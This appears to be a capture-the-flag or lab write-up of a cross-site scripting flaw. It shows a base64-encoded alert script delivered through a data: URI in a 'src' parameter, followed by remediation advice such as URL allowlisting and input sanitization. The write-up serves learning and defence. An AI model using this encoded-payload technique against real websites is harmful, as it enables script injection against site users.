https://owasp.org/www-community/attacks/xss/#xss-using-code-encoding

By inspecting the source code of the front page we can see that there is a
<a href="?page=media&src=nsa">
meaning that the page 'media' accepts 'src' filter to which we can pass our
script, though not directly, but in an encoded way.

First, encode <script>alert('Yay')</script> or any other script with base64 like so:
    base64 <<< "<script>alert('Yay')</script>"
    PHNjcmlwdD5hbGVydCgnWWF5Jyk8L3NjcmlwdD4K

Then, pass it to 'src' filter
http://<ip_address>/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWWF5Jyk8L3NjcmlwdD4K

FIX

- Canonicalize (standardize/normalize) input to "normal" form (in our case, unencrypt if encrypted)
- Do URL Validation through regex and accept only pre-defined patterns after "src="
- Do safe URL verification through making a whitelist dictionary 
    with safe HTTP and HTTPS URLs you accept (e.g. in Django/Python use:
    url_has_allowed_host_and_scheme(url, allowed_hosts, require_https=True))
- Sanitize user input (e.g. Python Bleach tool)
- Don't run scripts from user input

https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#xss-prevention-rules-summary